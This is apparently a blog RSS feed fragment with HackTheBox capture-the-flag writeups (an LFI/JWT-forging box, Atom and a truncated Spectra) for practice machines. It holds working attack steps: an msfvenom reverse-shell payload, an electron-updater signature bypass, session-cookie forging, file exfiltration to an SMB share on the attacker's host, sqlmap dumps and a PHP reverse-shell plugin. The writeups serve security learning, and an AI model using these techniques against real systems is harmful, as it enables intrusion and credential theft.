&lt;p&gt;Let&amp;rsquo;s capture the request with burpsuite to see what&amp;rsquo;s actually going on&lt;/p&gt;
 &lt;img src=&#34;LFI1.png&#34;&gt;
&lt;p&gt;Aside from the title and author parameters we have &amp;ldquo;method=0&amp;rdquo; which seems odd&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s first send the request to repeater and change &amp;ldquo;method=1&amp;rdquo;&lt;/p&gt;
 &lt;img src=&#34;LFI21.png&#34;&gt;
 &lt;img src=&#34;LFI22.png&#34;&gt;
&lt;p&gt;We get a different and an interesting response which screams &amp;ldquo;local file inclusion&amp;rdquo; that also leaks the parameter &amp;ldquo;book&amp;rdquo;, let&amp;rsquo;s check if that works&lt;/p&gt;
 &lt;img src=&#34;LFI3.png&#34;&gt;
&lt;p&gt;And yes! We have an LFI, let&amp;rsquo;s keep enumerating we don&amp;rsquo;t really have anything interesting to read yet&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;gobuster dir -u http://10.10.10.228/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -x asp,aspx,php

&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;-x prefix for adding extensions when fuzzing , since we&amp;rsquo;re working on windows box we may find asp/x files
Also chose the lowercase version of raft-directories because windows is key sensitive,&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img src=&#34;gob.png&#34;&gt;
&lt;p&gt;Seems like we have a login panel&lt;/p&gt;
&lt;img src=&#34;login.png&#34;&gt;
&lt;p&gt;Since we&amp;rsquo;re looking for files to read we&amp;rsquo;re not gonna try to do stuff with the login panel! Let&amp;rsquo;s run gobuster again&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;gobuster dir -u http://10.10.10.228/portal -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -x asp,aspx,php
&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;gob1.png&#34;&gt;
Let&#39;s check all of these
&lt;p&gt;&lt;code&gt;/includes/&lt;/code&gt;
&lt;img src=&#34;include.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/php/&lt;/code&gt;
&lt;img src=&#34;files.png&#34;&gt;&lt;/p&gt;
&lt;img src=&#34;users.png&#34;&gt;
Here we have a list of users, Let&#39;s take note of them first and save them somewhere in case we needed users later
&lt;hr&gt;
&lt;h1 id=&#34;p-stylecolorredfoothold-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Foothold &lt;/p&gt;&lt;/h1&gt;
&lt;hr&gt;
&lt;p&gt;Let&amp;rsquo;s not waste more time and check the files under /includes/ and also the cookie.php under /portal/ with our LFI&lt;/p&gt;
&lt;p&gt;&lt;code&gt;include/fileController.php&lt;/code&gt;&lt;/p&gt;
&lt;img src=&#34;filecont.png&#34;&gt;
&lt;p&gt;We get the JWT secret&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$secret_key = &#39;6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Another interesting thing in the response&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;if(in_array($user, $admins) &amp;amp;&amp;amp; $_SESSION[&#39;username&#39;] == \&amp;quot;paul\&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Seems like we need to login as the user paul&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s check &lt;code&gt;Cookie.php&lt;/code&gt;
&lt;img src=&#34;cookie.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;If we clean the response, a quick sed to remove the &amp;ldquo;\r \n and &amp;quot;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
/** * @param string $username  Username requesting session cookie * 
* @return string $session_cookie Returns the generated cookie *
* @devteam * Please DO NOT use default PHPSESSID; our security team says they are predictable. 
*CHANGE SECOND PART OF MD5 KEY EVERY WEEK **/

  function makesession($username){    
  	$max = ;    
  	$seed = rand(0, $max);    
  	$key = &amp;quot;s4lTy_stR1nG_&amp;quot;.$username[$seed].&amp;quot;(!528./9890&amp;quot;;    
  	$session_cookie = $username.md5($key);    
  	return $session_cookie;}

?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;We know that the user is &amp;ldquo;paul&amp;rdquo; which is a short username, we can generate all the possible cookies and try them until one works&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
$user=&amp;quot;paul&amp;quot;;
for ($seed = 0; $seed &amp;lt;= strlen($user) - 1; $seed++) {
	$key = &amp;quot;s4lTy_stR1nG_&amp;quot;.$user[$seed].&amp;quot;(!528./9890&amp;quot;;  
	$session_cookie = $user.md5($key);
	echo &amp;quot;[+] Cookie : &amp;quot;.$session_cookie.&amp;quot;\n&amp;quot;;
  
};
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;cok.png&#34;&gt;
&lt;p&gt;Let&amp;rsquo;s try them one by one and check if we can get in&lt;/p&gt;
&lt;img src=&#34;adm1.png&#34;&gt;
&lt;img src=&#34;adm.png&#34;&gt;
&lt;p&gt;And we&amp;rsquo;re in!&lt;/p&gt;
&lt;p&gt;Nothing interesting in the Issues page&lt;/p&gt;
&lt;img src=&#34;Issues.png&#34;&gt;
&lt;p&gt;Let&amp;rsquo;s check the File management page&lt;/p&gt;
&lt;img src=&#34;file.png&#34;&gt;
&lt;p&gt;Let&amp;rsquo;s try to upload anything to see if it works&lt;/p&gt;
&lt;img src=&#34;token.png&#34;&gt;
&lt;p&gt;Seems like we need a token! We have the secret, but we forgot to check what data we should provide!
Let&amp;rsquo;s check the response back&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ret = JWT::decode($jwt, $secret_key, array(&#39;HS256&#39;)); 
return $ret;
if($_SERVER[&#39;REQUEST_METHOD&#39;] === \&amp;quot;POST\&amp;quot;){
  $admins = array(\&amp;quot;paul\&amp;quot;);
  $user = validate()-&amp;gt;data-&amp;gt;username;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;According to this response the content of JWT token should be&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;{&amp;quot;data&amp;quot;:{&amp;quot;username&amp;quot;:&amp;quot;paul&amp;quot;}}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Now we have everything we need let&amp;rsquo;s forge our token, we can either use python or jwt.io&lt;/p&gt;
&lt;img src=&#34;jwt.png&#34;&gt;
&lt;pre&gt;&lt;code&gt;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7InVzZXJuYW1lIjoicGF1bCJ9fQ.4mJguG8tRd2z_feWJpmr_J3AdMeDPvW7GCK7cW7o0AI
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Let&amp;rsquo;s add the cookie to our browser&lt;/p&gt;
&lt;img src=&#34;newjwt.png&#34;&gt;
&lt;p&gt;Let&amp;rsquo;s to import anything&lt;/p&gt;
&lt;img src=&#34;succ.png&#34;&gt;
&lt;p&gt;It worked!&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s upload the reverse shell!&lt;/p&gt;
&lt;img src=&#34;foothold.png&#34;&gt;
&lt;p&gt;And we&amp;rsquo;re in&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;p-stylecolorredjuliette-user-privesc-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Juliette User PrivESC &lt;/p&gt;&lt;/h1&gt;
&lt;hr&gt;
&lt;p&gt;As usual, before running any enumeration tool we can check the webpage source to see if something is hidden there!&lt;/p&gt;
&lt;p&gt;We can see an interesting folder under the /portal/&lt;/p&gt;
&lt;img src=&#34;data.png&#34;&gt;
&lt;img src=&#34;userdata.png&#34;&gt;
&lt;p&gt;We have few files for users,
Let&amp;rsquo;s check if they contains any password&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Get-ChildItem | Select-String &#39;password&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;userflag.png&#34;&gt;
&lt;p&gt;And we get creds for user juliette&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;juliette:jUli901./())!
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Let&amp;rsquo;s try to ssh into the box with these creds&lt;/p&gt;
&lt;img src=&#34;userf.png&#34;&gt;
&lt;hr&gt;
&lt;h1 id=&#34;p-stylecolorreddevelopment-user-privesc-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Development User PrivESC &lt;/p&gt;&lt;/h1&gt;
&lt;hr&gt;
&lt;p&gt;In juliette&amp;rsquo;s Desktop we can find an interesting file &lt;code&gt;todo.html&lt;/code&gt;&lt;/p&gt;
&lt;img src=&#34;todo1.png&#34;&gt;
&lt;img src=&#34;todo2.png&#34;&gt;
&lt;p&gt;Seems like we need to get the passwords that are stored in the stickynotes! According to google they should located under the %appdata% folder&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Get-ChildItem *Sticky* -Recurse
&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;sticky.png&#34;&gt;
&lt;p&gt;We found a directory!&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;C:\users\juliette\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;It contains more folders, the \LocalState\ seems interesting!
&lt;img src=&#34;state.png&#34;&gt;
Let&amp;rsquo;s copy these files to our machine!
Fist we start our smbserver&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;python3 /usr/share/doc/python3-impacket/examples/smbserver.py -ip 10.10.14.6 -smb2support euch .
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;and copy these files!&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;copy * \\10.10.14.6\euch
&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;smb.png&#34;&gt;
&lt;p&gt;Let&amp;rsquo;s check the files! the only interesting file we need is &lt;code&gt;plum.sqlite-wal&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;It contains  the creds for the development user&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;\id=fc0d8d70-055d-4870-a5de-d76943a68ea2 development: fN3)sN5Ee@g

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Let&amp;rsquo;s try to ssh with these creds
&lt;img src=&#34;sshdev.png&#34;&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;p-stylecolorredroot-user-privesc-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Root User PrivESC &lt;/p&gt;&lt;/h1&gt;
&lt;hr&gt;
&lt;p&gt;Now we&amp;rsquo;re logged in as development, we can check what&amp;rsquo;s inside &lt;code&gt;C:\Development\&lt;/code&gt;&lt;/p&gt;
&lt;img src=&#34;ff.png&#34;&gt;
&lt;p&gt;Let&amp;rsquo;s copy it to our machine&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;copy Krypter_Linux \\10.10.14.6\euch

&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;kryp.png&#34;&gt;
It&#39;s a Linux executable, before going deeper in the binary it&#39;s better to run strings or rabin2 -z to extract the printable strings in the binary!
&lt;img src=&#34;rabin.png&#34;&gt;
&lt;p&gt;What seems odd when you see the output is the port 1234!&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://passmanager.htb:1234/index.php
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Also we have the GET parameters&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;method=select&amp;amp;username=administrator&amp;amp;table=passwords
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Seems like it&amp;rsquo;s running locally!&lt;/p&gt;
&lt;img src=&#34;local.png&#34;&gt;
&lt;p&gt;Let&amp;rsquo;s forward it to our machine with ssh&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ssh -L 1234:127.0.0.1:1234 development@10.10.10.228
&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;for.png&#34;&gt;
&lt;p&gt;The parameters names gives us a hint that it&amp;rsquo;s SQL injection
let&amp;rsquo;s use sqlmap&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sqlmap -u &amp;quot;http://127.0.0.1:1234/?method=select&amp;amp;username=administrator&amp;amp;table=passwords&amp;quot; --dump
&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;us.png&#34;&gt;
&lt;img src=&#34;AES.png&#34;&gt;
&lt;p&gt;We get the administrator&amp;rsquo;s password but it&amp;rsquo;s encrypted (AES)&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s use cyberchef to decrypt it&lt;/p&gt;
&lt;img src=&#34;root.png&#34;&gt;
&lt;blockquote&gt;
&lt;p&gt;When i first did the machine, I overthinked this part,  I thought that i needed to to find IV somewhere in the machine &lt;Wasted a lot of time trying to find it&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;And now let&amp;rsquo;s try to ssh into the box as the administrator and grab the flag!&lt;/p&gt;
&lt;img src=&#34;rooted.png&#34;&gt;
&lt;h2 id=&#34;thanks-for-reading-hope-you-enjoyed-it&#34;&gt;Thanks for reading hope you enjoyed it!&lt;/h2&gt;
</description>
    </item>
    
    <item>
      <title>HackTheBox - Atom Writeup</title>
      <link>https://mohamed-elleuch.me/writeups/htb-atom/</link>
      <pubDate>Sat, 10 Jul 2021 00:00:00 +0000</pubDate>
      <guid>https://mohamed-elleuch.me/writeups/htb-atom/</guid>
      <description>&lt;h1 id=&#34;p-stylecolorredinformation-gathering-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Information Gathering &lt;/p&gt;&lt;/h1&gt;
&lt;hr&gt;
&lt;h2 id=&#34;p-stylecolorgreennmap-scan-p&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Nmap scan &lt;/p&gt;&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;sudo nmap -sC -sV 10.10.10.237 -v
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;80/tcp  open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
| http-methods: 
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: Heed Solutions
135/tcp open  msrpc        Microsoft Windows RPC
443/tcp open  ssl/http     Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
| http-methods: 
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: Heed Solutions
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a4 4cc9 9e84 b26f 9e63 9f9e d229 dee0
|_SHA-1: b023 8c54 7a90 5bfa 119c 4e8b acca eacf 3649 1ff6
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
445/tcp open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)

&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;p-stylecolorgreenweb-enumeration-p&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Web Enumeration &lt;/p&gt;&lt;/h2&gt;
&lt;img src=&#34;web.png&#34;&gt;
&lt;p&gt;It&amp;rsquo;s a static page with an executeable to download, but nothing interesting! Let&amp;rsquo;s keep enumerating&lt;/p&gt;
&lt;h2 id=&#34;p-stylecolorgreensmb-enumeration-p&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;SMB Enumeration &lt;/p&gt;&lt;/h2&gt;
&lt;img src=&#34;smb.png&#34;&gt;
&lt;p&gt;An interesting share &lt;code&gt;Software_Updates&lt;/code&gt; let&amp;rsquo;s take a look at it&lt;/p&gt;
&lt;img src=&#34;foothold.png&#34;&gt;
&lt;p&gt;Let&amp;rsquo;s try download everything&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;prompt off
recurse on
mget *
&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;smbfiles.png&#34;&gt;
We only have a pdf file!
&lt;hr&gt;
&lt;h1 id=&#34;p-stylecolorred-foothold-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt; Foothold &lt;/p&gt;&lt;/h1&gt;
&lt;hr&gt;
&lt;p&gt;Let&amp;rsquo;s take a look at the pdf file&lt;/p&gt;
&lt;img src=&#34;electron.png&#34;&gt;
&lt;img src=&#34;electron1.png&#34;&gt;
&lt;p&gt;The Heedv1 app is build with &lt;code&gt;electron-builder&lt;/code&gt; and also we can drop updates in the client folders in the smb and it get executed.
Searching in  google for an electron builder update rce, we can find an interesting&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html&#34;&gt;https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Let&amp;rsquo;s first create our shell with the name &amp;ldquo;s&amp;rsquo;hell.exe&amp;rdquo; to bypass the signature&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;msfvenom -p windows/shell_reverse_tcp  lhost=10.10.14.5 lport=9001 -f exe -o &amp;quot;s&#39;hell.exe&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;And also generate the encdoded shasum of our malicious file&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;shasum -a 512 s\&#39;hell.exe | cut -d &amp;quot; &amp;quot; -f1 | xxd -r -p | base64
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Now we&amp;rsquo;re ready to create our &lt;code&gt;latest.yml&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-yml&#34;&gt;version: 1.2.3

path: http:/IP:PORT/s&#39;hell.exe
sha512: CZsOB2[-SNIP-]2tW5UhzwqzLVkkpzAbuIw==
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Let&amp;rsquo;s setup a listener and upload them to the clients folder in the smb! And wait until we get a shell back&lt;/p&gt;
&lt;img src=&#34;foothold.png&#34;&gt;
&lt;p&gt;We&amp;rsquo;re on the box now! And we can get the user flag !:D&lt;/p&gt;
&lt;img src=&#34;user.png&#34;&gt;
&lt;hr&gt;
&lt;h1 id=&#34;p-stylecolorred-privesc-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt; PrivEsc &lt;/p&gt;&lt;/h1&gt;
&lt;hr&gt;
&lt;p&gt;Before running any enumerating tool, i always check the Program file, the documents and Downloads folders to check if we have any custom Software  (a aka free win) installed in the system!&lt;/p&gt;
&lt;img src=&#34;portable.png&#34;&gt;
&lt;p&gt;We  can copy the whole folder and try to retrieve the encrypted like the machine &lt;code&gt;sharp&lt;/code&gt; but let&amp;rsquo;s keep enumerating!&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;https://www.exploit-db.com/exploits/49409&#34;&gt;https://www.exploit-db.com/exploits/49409&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img src=&#34;redis.png&#34;&gt;
&lt;p&gt;We can see that Redis is installed, we can grab the redis password from the config file&lt;/p&gt;
&lt;img src=&#34;pass.png&#34;&gt;
&lt;pre&gt;&lt;code&gt;requirepass kidvscat_yes_kidvscat
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Now we can enumerate the redis service!&lt;/p&gt;
&lt;p&gt;We will use the redis-tools package&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo apt-get install redis-tools
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;A very good ressource, i&amp;rsquo;ll use everything from here &lt;a href=&#34;https://book.hacktricks.xyz/pentesting/6379-pentesting-redis&#34;&gt;https://book.hacktricks.xyz/pentesting/6379-pentesting-redis&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Let&amp;rsquo;s dump the database&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-redis&#34;&gt;info
&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;rd.png&#34;&gt;
&lt;p&gt;Let&amp;rsquo;s list the keys from the db0&lt;/p&gt;
&lt;img src=&#34;rd1.png&#34;&gt;
&lt;p&gt;Let&amp;rsquo;s check their content
&lt;img src=&#34;PS.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;The key &lt;code&gt;pkâ±user:e8e29158-d70d-44b1-a1ba-4949d52790a0&lt;/code&gt; seems to give us credentials&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Administrator:Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Seems like it&amp;rsquo;s an encrypted password! And we already know that we have an exploit to decrypt it ! Lets give it a try&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s just take a snippet from the exploit-db exploit&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python3
import base64
from des import *
def decode(hash):
	hash = base64.b64decode(hash.encode(&#39;utf-8&#39;))
	key = DesKey(b&amp;quot;7ly6UznJ&amp;quot;)
	return key.decrypt(hash,initial=b&amp;quot;XuVUm5fR&amp;quot;,padding=True).decode(&#39;utf-8&#39;)

print(&#39;[+] Decrypted Password: &#39;+decode(&#39;Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi&#39;))
&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;adminpass.png&#34;&gt;
&lt;pre&gt;&lt;code&gt;Administrator:kidvscat_admin_@123
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Now let&amp;rsquo;s login as administrator to the machine&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;winexe -U &#39;Administrator%kidvscat_admin_@123&#39; //10.10.10.237 cmd.exe
&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;toor.png&#34;&gt;
&lt;p&gt;And we rooted the machine!&lt;/p&gt;
&lt;h2 id=&#34;thanks-for-reading-hope-you-enjoyed-it&#34;&gt;Thanks for reading hope you enjoyed it!&lt;/h2&gt;
</description>
    </item>
    
    <item>
      <title>HackTheBox - Spectra Writeup</title>
      <link>https://mohamed-elleuch.me/writeups/htb-spectra/</link>
      <pubDate>Sat, 26 Jun 2021 00:00:00 +0000</pubDate>
      <guid>https://mohamed-elleuch.me/writeups/htb-spectra/</guid>
      <description>&lt;h1 id=&#34;p-stylecolorredinformation-gathering-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Information Gathering &lt;/p&gt;&lt;/h1&gt;
&lt;hr&gt;
&lt;h2 id=&#34;p-stylecolorgreennmap-scan-p&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Nmap scan &lt;/p&gt;&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sudo nmap -sC -sV 10.10.10.229 -v
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;22/tcp   open  ssh              OpenSSH 8.1 (protocol 2.0)
| ssh-hostkey: 
|_  4096 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a (RSA)
80/tcp   open  http             nginx 1.17.4
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.17.4
|_http-title: Site doesn\&#39;t have a title (text/html).
3306/tcp open  mysql            MySQL (unauthorized)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
8081/tcp open  blackice-icecap?
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest: 
|     HTTP/1.1 200 OK
|     Content-Type: text/plain
|     Date: Sat, 26 Jun 2021 10:57:52 GMT
|     Connection: close
|     Hello World
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Content-Type: text/plain
|     Date: Sat, 26 Jun 2021 10:57:58 GMT
|     Connection: close
|_    Hello World

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;We have 4 ports open&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;p-stylecolorgreenweb-enum-p&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Web Enum &lt;/p&gt;&lt;/h2&gt;
&lt;p&gt;First let&amp;rsquo;s add &lt;code&gt;spectra.htb&lt;/code&gt; to &lt;code&gt;/etc/hosts&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;echo &amp;quot;10.10.10.229 spectra.htb&amp;quot; &amp;gt;&amp;gt; /etc/hosts
&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;web1.png&#34;&gt;
&lt;p&gt;Let&amp;rsquo;s check both of these pages&lt;/p&gt;
&lt;img src=&#34;web2.png&#34;&gt;
&lt;p&gt;Just a simple wordpress page&lt;/p&gt;
&lt;img src=&#34;web3.png&#34;&gt;
&lt;p&gt;From this error we can know that we&amp;rsquo;re dealing with another wordpress page but it&amp;rsquo;s misconfigured&lt;/p&gt;
&lt;img src=&#34;dirlist.png&#34;&gt;
&lt;p&gt;We have also directory listing on &lt;code&gt;/testing/&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;We can see aswell an interesting file &lt;code&gt;wp-config.php.save&lt;/code&gt; Which seems to be a backup of the original config file&lt;/p&gt;
&lt;img src=&#34;wpconfig.png&#34;&gt;
&lt;p&gt;We get credentials&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;
/** MySQL database username */
define( &#39;DB_USER&#39;, &#39;devtest&#39; );

/** MySQL database password */
define( &#39;DB_PASSWORD&#39;, &#39;devteam01&#39; );
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Let&amp;rsquo;s try to login&lt;/p&gt;
&lt;img src=&#34;devtest.png&#34;&gt;
&lt;p&gt;We couldn&amp;rsquo;t login with this username!
This is an easy rated machine, we can manually check if this password works with any default username &lt;code&gt;admin/administrator&lt;/code&gt; for exemple&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Admin user doesn&amp;rsquo;t exist&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;administrator exists ; let&amp;rsquo;s try the password we got&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;img src=&#34;login.png&#34;&gt;
&lt;p&gt;And we&amp;rsquo;re in&lt;/p&gt;
&lt;h1 id=&#34;p-stylecolorredfoothold-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Foothold &lt;/p&gt;&lt;/h1&gt;
&lt;hr&gt;
&lt;p&gt;Let&amp;rsquo;s create our malicious plugin&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;I&amp;rsquo;ll use pentestmonkey&amp;rsquo;s php revshell &lt;a href=&#34;https://github.com/pentestmonkey/php-reverse-shell&#34;&gt;https://github.com/pentestmonkey/php-reverse-shell&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img src=&#34;rev.png&#34;&gt;
&lt;p&gt;Let&amp;rsquo;s now upload thiss plugin&lt;/p&gt;
&lt;img src=&#34;revzip.png&#34;&gt;
&lt;p&gt;Let&amp;rsquo;s setup a listener and install the plugin&lt;/p&gt;
&lt;img src=&#34;install.png&#34;&gt;
&lt;img src=&#34;foothold.png&#34;&gt;
&lt;p&gt;And we&amp;rsquo;re on the box&lt;/p&gt;
&lt;h1 id=&#34;p-stylecolorreduser-flag-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;User Flag &lt;/p&gt;&lt;/h1&gt;
&lt;hr&gt;
&lt;p&gt;After enumerating a bit, we can see an interesting file in &lt;code&gt;/opt/&lt;/code&gt;&lt;/p&gt;
&lt;img src=&#34;autologin.png&#34;&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# Copyright 2016 The Chromium OS Authors. All rights reserved.
# Use of this source code is governed by a BSD-style license that can be
# found in the LICENSE file.
description   &amp;quot;Automatic login at boot&amp;quot;
author        &amp;quot;chromium-os-dev@chromium.org&amp;quot;
# After boot-complete starts, the login prompt is visible and is accepting
# input.
start on started boot-complete
script
  passwd=
  # Read password from file. The file may optionally end with a newline.
  for dir in /mnt/stateful_partition/etc/autologin /etc/autologin; do
    if [ -e &amp;quot;${dir}/passwd&amp;quot; ]; then
      passwd=&amp;quot;$(cat &amp;quot;${dir}/passwd&amp;quot;)&amp;quot;
      break
    fi
  done
  if [ -z &amp;quot;${passwd}&amp;quot; ]; then
    exit 0
  fi
  # Inject keys into the login prompt.
  #
  # For this to work, you must have already created an account on the device.
  # Otherwise, no login prompt appears at boot and the injected keys do the
  # wrong thing.

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;So as the comment says it&amp;rsquo;s going to get the password from  &lt;code&gt;/mnt/stateful_partition/etc/autologin/passwd&lt;/code&gt; or &lt;code&gt;/etc/autologin/passwd&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s try both of these&lt;/p&gt;
&lt;img src=&#34;user.png&#34;&gt;
